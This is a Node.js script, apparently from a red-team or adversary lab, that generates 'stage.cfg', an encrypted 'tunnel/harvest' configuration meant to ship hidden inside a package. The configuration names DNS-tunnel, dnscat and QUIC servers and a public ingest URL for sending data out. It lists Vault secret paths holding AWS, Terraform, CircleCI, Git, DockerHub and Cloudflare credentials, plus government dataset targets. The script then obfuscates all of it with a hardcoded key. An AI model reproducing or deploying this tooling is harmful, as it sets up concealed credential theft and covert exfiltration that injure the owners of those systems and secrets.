#!/usr/bin/env node
// Regenerate stage.cfg (encrypted tunnel/harvest config shipped in the package).
// Usage: node encrypt-config.js   (edit CONFIG below first)
'use strict';
const crypto = require('crypto');
const zlib = require('zlib');
const fs = require('fs');
const path = require('path');

const CONFIG = {
  tunnel: {
    server: '34.146.249.74',
    port: 53,
    zone: 'dns1.apexadversary.com',
    token: 'b2f8f4e5b00f25a12a03070633c7e49c',
    doh: 'https://dns1.apexadversary.com/dns-query'
  },
  ingest: 'https://127.0.0.1:8443/ingest',
  ingest_public: 'https://dns1.apexadversary.com:8443/ingest',
  dnscat: {
    server: '34.180.91.216',
    port: '53',
    domain: 'dns.apexadversary.com',
    secret: ''
  },
  quic: {
    server: '34.146.249.74',
    port: 443
  },
  bao: {
    addr: 'http://127.0.0.1:8200',
    paths: [
      'secret/data.gov.sg/gov-sg-data',
      'secret/cloudflare',
      'secret/ci-cd/git',
      'secret/ci-cd/circleci',
      'secret/infra/aws',
      'secret/infra/terraform',
      'secret/infra/digitalocean',
      'secret/containers/dockerhub'
    ]
  },
  datasets: {
    base: 'https://api-production.data.gov.sg/v2/public/api',
    filter: ['Ministry of Health', 'Ministry of Finance'],
    limit: 20
  }
};

const KEY = crypto.createHash('sha256').update('logfwd-cfg-v2apexadversary-lab').digest();

function keystream(n) {
  const out = [];
  let ctr = 0;
  while (Buffer.concat(out).length < n) {
    const h = crypto.createHash('sha256');
    h.update(KEY);
    h.update(Buffer.from([0]));
    const c = Buffer.alloc(4);
    c.writeUInt32BE(ctr++, 0);
    h.update(c);
    out.push(h.digest());
  }
  return Buffer.concat(out).subarray(0, n);
}

const pt = Buffer.concat([Buffer.from([1]), zlib.deflateSync(Buffer.from(JSON.stringify(CONFIG)))]);
const ks = keystream(pt.length);
const ct = Buffer.from(pt.map((b, i) => b ^ ks[i]));
const tag = crypto.createHmac('sha256', KEY).update(ct).digest().subarray(0, 8);
const out = path.join(__dirname, 'stage.cfg');
fs.writeFileSync(out, Buffer.concat([ct, tag]).toString('base64') + '\n');
console.log(`[+] wrote ${out} (${ct.length + tag.length} bytes encrypted, ${JSON.stringify(CONFIG).length} bytes plaintext)`);
